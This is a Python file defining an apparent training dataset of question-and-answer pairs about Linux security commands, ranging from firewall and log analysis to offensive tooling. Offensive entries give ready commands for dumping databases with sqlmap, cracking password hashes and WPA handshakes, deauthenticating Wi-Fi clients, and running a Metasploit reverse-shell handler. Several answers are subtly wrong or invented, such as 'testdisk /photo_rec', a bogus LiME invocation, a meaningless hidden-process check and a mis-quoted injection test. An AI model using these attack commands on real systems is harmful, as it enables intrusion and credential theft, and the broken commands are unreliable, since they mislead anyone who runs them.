LINUX_COMMANDS_DATASET = [
    {
        "category": "Network Scanning & Recon",
        "instruction": "How do I scan a network for open ports using nmap?",
        "response": "nmap -sS -sV -O -p- 192.168.1.0/24\n- -sS: SYN stealth scan\n- -sV: version detection\n- -O: OS detection\n- -p-: all 65535 ports\n- Output: Nmap scan report showing open ports, services, versions, and OS guess"
    },
    {
        "category": "Network Scanning & Recon",
        "instruction": "How do I perform a quick port scan on a single host?",
        "response": "nmap -T4 -F <target_ip>\n- -T4: aggressive timing\n- -F: fast scan (top 100 ports)\n- Use -Pn to skip host discovery if host blocks ping"
    },
    {
        "category": "Network Scanning & Recon",
        "instruction": "How do I enumerate services and their versions?",
        "response": "nmap -sV --version-intensity 9 <target>\nnmap -sV -sC <target>  # with default NSE scripts\nUse masscan for faster scanning: masscan -p1-65535 --rate=1000 <target>"
    },
    {
        "category": "Network Monitoring",
        "instruction": "How do I monitor network traffic in real-time?",
        "response": "tcpdump -i eth0 -nn -X\n- -i eth0: interface\n- -nn: don't resolve hostnames/ports\n- -X: hex+ASCII output\n- Filter examples: tcpdump port 80, tcpdump host 10.0.0.1, tcpdump 'tcp[tcpflags] & tcp-syn != 0'"
    },
    {
        "category": "Network Monitoring",
        "instruction": "How do I capture HTTP traffic only?",
        "response": "tcpdump -i eth0 -A 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354 or tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x474554)'\nOr simpler: tcpdump -i eth0 -A 'tcp port 80'\ntshark -Y 'http.request or http.response' -T fields -e http.host -e http.request.uri"
    },
    {
        "category": "Network Monitoring",
        "instruction": "How do I monitor live network connections?",
        "response": "netstat -tulpn  # listening ports with PIDs\nss -tulpn       # modern replacement, faster\nlsof -i -P -n   # list open network files\nwatch -n 1 'ss -tulpn'  # real-time monitoring\niftop -i eth0   # bandwidth per connection\nnethogs eth0    # bandwidth per process"
    },
    {
        "category": "Log Analysis",
        "instruction": "How do I analyze auth logs for failed login attempts?",
        "response": "grep 'Failed password' /var/log/auth.log | awk '{print $1, $2, $11}' | sort | uniq -c | sort -nr\n# Failed SSH attempts by IP:\nawk '/Failed password/ {print $(NF-3)}' /var/log/auth.log | sort | uniq -c | sort -nr\n# Last 100 failed attempts:\ntail -100 /var/log/auth.log | grep 'Failed password'"
    },
    {
        "category": "Log Analysis",
        "instruction": "How do I monitor syslog in real-time for attacks?",
        "response": "tail -f /var/log/syslog | grep -E '(Failed|Invalid|error|attack|blocked)'\njournalctl -f -u ssh.service\n# Real-time brute force detection:\ntail -f /var/log/auth.log | awk '/Failed password/ {ip[$(NF-3)]++} END {for (i in ip) if (ip[i] > 5) print i, ip[i]}'"
    },
    {
        "category": "Log Analysis",
        "instruction": "How do I search for specific events in logs?",
        "response": "journalctl -u ssh.service --since '24 hours ago'\njournalctl -k --grep='iptables|fail2ban'\ngrep -r 'attack' /var/log/ --include='*.log' -l\n# Apache/nginx access log analysis:\nawk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -20"
    },
    {
        "category": "Firewall & Hardening",
        "instruction": "How do I configure iptables for basic security?",
        "response": "# Default policies:\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT ACCEPT\n# Allow established connections:\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n# Allow loopback:\niptables -A INPUT -i lo -j ACCEPT\n# Allow SSH:\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\n# Allow HTTP/HTTPS:\niptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT\n# Rate limit:\niptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set\niptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 4 -j DROP\n# Save: iptables-save > /etc/iptables/rules.v4"
    },
    {
        "category": "Firewall & Hardening",
        "instruction": "How do I block an IP address with iptables?",
        "response": "iptables -A INPUT -s <bad_ip> -j DROP\niptables -A INPUT -s <bad_ip> -j LOG --log-prefix 'BLOCKED: '\n# Block entire subnet:\niptables -A INPUT -s 10.0.0.0/8 -j DROP\n# Block all except specific IP:\niptables -A INPUT -s ! 192.168.1.100 -p tcp --dport 22 -j DROP\n# Add to fail2ban: echo '<bad_ip>' | sudo tee -a /etc/fail2ban/blocklist.txt"
    },
    {
        "category": "Firewall & Hardening",
        "instruction": "How do I use ufw for a quick firewall setup?",
        "response": "ufw default deny incoming\nufw default allow outgoing\nufw allow ssh\nufw allow 80/tcp\nufw allow 443/tcp\nufw enable\nufw status verbose\n# Deny specific IP:\nufw deny from <bad_ip>\n# Limit SSH rate:\nufw limit ssh\n# View logs: tail -f /var/log/ufw.log"
    },
    {
        "category": "Process & System Monitoring",
        "instruction": "How do I find suspicious processes?",
        "response": "ps aux --sort=-%cpu | head -20\nps aux --sort=-%mem | head -20\ntop -b -n 1 | head -30\nhtop  # interactive\n# Check network connections per process:\nlsof -i -P -n | grep ESTABLISHED\n# Hidden processes:\nps -e | grep -v \"$(cat /proc/version)\" 2>/dev/null"
    },
    {
        "category": "Process & System Monitoring",
        "instruction": "How do I detect rootkits and backdoors?",
        "response": "rkhunter --check --skey\nchkrootkit\n# Check for unusual cron jobs:\ncrontab -l\nls -la /etc/cron*\n# Check startup scripts:\nls -la /etc/init.d/ /etc/systemd/system/\n# Check for SUID binaries:\nfind / -perm -4000 -type f 2>/dev/null\n# Check listening ports:\nss -tulpn | grep -E '(443|4444|31337|1337)'"
    },
    {
        "category": "Process & System Monitoring",
        "instruction": "How do I monitor file integrity?",
        "response": "# AIDE setup:\naideinit\naide --check\n# Tripwire:\ntripwire --init\ntripwire --check | grep 'Modified'\n# Manual with find:\nfind /etc -type f -newer /etc/shadow -exec ls -la {} \\;\n# Inotify for real-time:\ninotifywait -m -r -e modify,create,delete /etc/"
    },
    {
        "category": "Forensics & Analysis",
        "instruction": "How do I analyze a suspicious binary?",
        "response": "file <binary>\nstrings <binary> | grep -E '(http|https|/etc|/tmp|connect|socket)'\nstrings <binary> | head -100\nobjdump -d <binary> | head -50\nldd <binary>  # list dynamic libraries\nhexdump -C <binary> | head -50\n# Check entropy:\nent <binary>\n# VirusTotal:\nsha256sum <binary>\n# Static analysis: readelf -a <binary> | head -50"
    },
    {
        "category": "Forensics & Analysis",
        "instruction": "How do I capture and analyze memory dumps?",
        "response": "# Memory capture:\nlime-forensics -d /dev/crash -f mem.dump\n# Or using LiME:\ninsmod lime.ko path=mem.dump format=lime\n# Analysis with volatility:\nvolatility -f mem.dump imageinfo\nvolatility -f mem.dump --profile=Win7SP1x64 pslist\nvolatility -f mem.dump --profile=Win7SP1x64 netscan\nvolatility -f mem.dump --profile=Win7SP1x64 malfind"
    },
    {
        "category": "Forensics & Analysis",
        "instruction": "How do I recover deleted files?",
        "response": "testdisk /photo_rec  # recover partitions/files\nphotorec /dev/sda1    # recover specific file types\nforemost -t jpg,pdf -i /dev/sda1 -o /output\nextundelete /dev/sda1 --restore-all  # ext filesystems\nddrescue -d /dev/sda1 /images/image.dd /images/logfile\nstrings /dev/sda1 | grep -E 'http|password|key'"
    },
    {
        "category": "Password & Auth Security",
        "instruction": "How do I audit user accounts and passwords?",
        "response": "cat /etc/passwd | awk -F: '{print $1, $3, $7}'  # users + UID + shell\ncat /etc/shadow | awk -F: '{print $1, $2}'  # password hashes\n# Check for empty passwords:\nawk -F: '($2 == \"\") {print}' /etc/shadow\n# Find users with UID 0 (root):\nawk -F: '($3 == 0) {print}' /etc/passwd\n# Last logins:\nlast -10\nlastb -10  # failed logins"
    },
    {
        "category": "Password & Auth Security",
        "instruction": "How do I crack password hashes with hashcat?",
        "response": "hashcat -m 0 -a 0 hashes.txt rockyou.txt  # MD5 dictionary\nhashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a  # NTLM brute force\nhashcat -m 1800 -a 6 sha512crypt.txt wordlist.txt ?d?d  # sha512crypt + mask\n# Identify hash type:\nhashid <hash>\n# Show cracked: hashcat --show -m <type> hashes.txt"
    },
    {
        "category": "Web Security",
        "instruction": "How do I test for SQL injection?",
        "response": "sqlmap -u 'http://target.com/page?id=1' --batch --dbs\nsqlmap -u 'http://target.com/page?id=1' -D dbname --tables\nsqlmap -u 'http://target.com/page?id=1' -D dbname -T users --dump\n# Manual test:\ncurl 'http://target.com/page?id=1' OR '1'='1\n# POST injection:\nsqlmap -u 'http://target.com/login' --data='user=admin&pass=admin' --batch"
    },
    {
        "category": "Web Security",
        "instruction": "How do I perform directory/file enumeration?",
        "response": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt -t 50\nffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt\ndirb http://target.com /usr/share/wordlists/dirb/common.txt\n# With extensions:\ngobuster dir -u http://target.com -w wordlist.txt -x php,asp,html,txt\n# Recursive:\ndirbuster -u http://target.com -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    },
    {
        "category": "Web Security",
        "instruction": "How do I intercept and modify HTTP requests?",
        "response": "# Mitmproxy:\nmitmproxy -p 8080\nmitmweb -p 8080  # web interface\n# Burp Suite CLI:\njava -jar burpsuite.jar\n# Socat for simple proxy:\nsocat TCP-LISTEN:8080,fork TCP:target.com:80\n# cURL with proxy:\ncurl -x http://127.0.0.1:8080 http://target.com\n# Netcat for raw HTTP:\nprintf 'GET / HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n' | nc target.com 80"
    },
    {
        "category": "Encryption & Crypto",
        "instruction": "How do I encrypt/decrypt files with GPG?",
        "response": "gpg --symmetric --cipher-algo AES256 file.txt  # symmetric encrypt\ngpg --output file.txt.gpg --decrypt file.txt.gpg\ngpg --encrypt --recipient user@email.com file.txt  # asymmetric\ngpg --armor --encrypt --recipient user@email.com file.txt  # ASCII armor\ngpg --sign file.txt  # sign file\ngpg --verify file.txt.sig  # verify signature\ngpg --gen-key  # generate key pair"
    },
    {
        "category": "Encryption & Crypto",
        "instruction": "How do I use OpenSSL for secure operations?",
        "response": "# Generate CSR:\nopenssl req -new -newkey rsa:2048 -nodes -keyout key.pem -out request.csr\n# Self-signed cert:\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365\n# Encrypt file:\nopenssl enc -aes-256-cbc -salt -in file.txt -out file.enc\n# Decrypt:\nopenssl enc -d -aes-256-cbc -in file.enc -out file.txt\n# Check cert info:\nopenssl x509 -in cert.pem -text -noout"
    },
    {
        "category": "Network Exploitation",
        "instruction": "How do I use Metasploit for initial access?",
        "response": "msfconsole\n# Search for exploits:\nmsf6 > search type:exploit platform:linux name:ssh\nmsf6 > use exploit/multi/handler\nmsf6 > set payload linux/x64/meterpreter/reverse_tcp\nmsf6 > set LHOST 10.0.0.1\nmsf6 > set LPORT 4444\nmsf6 > exploit -j\n# Resource script:msf6 > resource /path/to/script.rc"
    },
    {
        "category": "Network Exploitation",
        "instruction": "How do I capture and crack WPA/WPA2 handshakes?",
        "response": "# Monitor mode:\nairomon-ng start wlan0\n# Capture:\nairodump-ng wlan0mon\nairodump-ng -c <channel> --bssid <AP_MAC> -w capture wlan0mon\n# Deauth:\naireplay-ng -0 5 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon\n# Crack:\naircrack-ng -w wordlist.txt capture-01.cap\nhashcat -m 22000 capture.hccapx wordlist.txt"
    },
    {
        "category": "Defense & Blue Team",
        "instruction": "What commands help detect lateral movement?",
        "response": "# Check network connections:\nnetstat -an | grep ESTABLISHED\n# Check listening ports:\nss -tulpn | grep -E ':(445|3389|5985|5986)'\n# Check scheduled tasks:\nschtasks /query /fo LIST /v\n# Check services:\nservice --status-all\n# Check SSH config:\ncat ~/.ssh/authorized_keys\n# Check .bash_history for unusual commands:\ncat ~/.bash_history | grep -E '(ssh|scp|wget|curl|nc|ncat)'"
    },
    {
        "category": "Defense & Blue Team",
        "instruction": "How do I set up fail2ban for SSH protection?",
        "response": "# Install:\napt install fail2ban\n# Configure /etc/fail2ban/jail.local:\n[sshd]\nenabled = true\nport = ssh\nfilter = sshd\nlogpath = /var/log/auth.log\nmaxretry = 3\nbantime = 3600\nfindtime = 600\n# Restart:\nsystemctl restart fail2ban\n# Check status:\nfail2ban-client status sshd\n# Unban:\nfail2ban-client set sshd unbanip <ip>"
    },
    {
        "category": "OSINT",
        "instruction": "How do I gather information about a domain?",
        "response": "whois example.com\ndig example.com ANY +short\nnslookup example.com\nhost -a example.com\n# DNS enumeration:\ndnsrecon -d example.com\n# Subdomain discovery:\nsubfinder -d example.com\nsublist3r -d example.com\n# Certificate transparency:\ncurl -s 'https://crt.sh/?q=%25.example.com&output=json' | jq ."
    },
    {
        "category": "OSINT",
        "instruction": "How do I find emails and usernames associated with a domain?",
        "response": "theHarvester -d example.com -b google,linkedin,bing\n# Email verification:\nsmtp-user-enum -M VRFY -U users.txt -t mail.example.com\n# Hunter.io API check:\ncurl -s 'https://api.hunter.io/v2/domain-search?domain=example.com&api_key=<key>'\n# Gitleaks for leaked creds:\ngitleaks detect --source https://github.com/org/repo.git"
    },
]


def get_linux_training_data() -> list:
    return [
        {
            "instruction": item["instruction"],
            "response": item["response"],
            "category": item["category"],
        }
        for item in LINUX_COMMANDS_DATASET
    ]


def get_categories() -> list:
    return list(dict.fromkeys(item["category"] for item in LINUX_COMMANDS_DATASET))
